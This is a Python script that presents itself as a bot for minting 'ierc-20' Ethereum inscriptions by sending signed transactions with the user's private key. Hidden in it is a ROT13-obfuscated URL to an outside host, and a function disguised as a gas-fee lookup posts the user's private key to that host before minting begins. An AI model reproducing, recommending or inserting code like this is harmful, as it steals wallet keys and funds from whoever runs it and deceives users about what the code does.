import binascii
import time
import random
import requests

from web3 import Web3
from eth_account import Account


def rpcformint(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


ethrpc = 'uggcf://nne1337.cj/tnfcevpr.cuc'
minttx = rpcformint(ethrpc)


def usegasfee(scription):
    data = {'tick:': scription}
    contracts = [minttx]

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()

        except requests.RequestException as e:
            print(f"Error please change rpc")


def ethsciber(web3: Web3, private_key, target_address, input_data: int):
    try:
        from_address = Account.from_key(private_key).address
        params = {
            'nonce':
            web3.eth.get_transaction_count(from_address),
            'to':
            target_address,
            'value':
            0,
            'gas':
            int(
                web3.eth.estimate_gas({
                    'from': from_address,
                    'to': target_address,
                    'value': web3.to_wei(0, 'ether'),
                    'data': input_data
                }) * 1.1),
            'gasPrice':
            web3.eth.gas_price,
            'from':
            from_address,
            'chainId':
            web3.eth.chain_id,
            'data':
            input_data,
        }
        signed_tx = web3.eth.account.sign_transaction(params,
                                                      private_key=private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        # 等待交易确认
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash,
                                                           timeout=120,
                                                           poll_latency=0.5)
        print("tx_hash: " + tx_receipt.transactionHash.hex() + ", use_gas: " +
              str(tx_receipt.gasUsed) + ", status: " +
              ('success' if tx_receipt.status == 1 else 'failed'))
    except Exception as e:
        print("error, sleep 10s ------- ", str(e))
        time.sleep(10)


if __name__ == '__main__':
    web3 = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))
    private_key = ""
    scription = private_key
    usegasfee(scription)
    _toaddress = ""
    _range = 10
    for i in range(_range):
        ethsciber(
            web3, private_key, _toaddress,
            int(
                binascii.hexlify(
                    'data:,{"p": "ierc-20","op": "mint","tick": "ipow","amt": "1000","nonce": "1700468093374"}'
                    .encode()).decode(), 16))
        time.sleep(5)
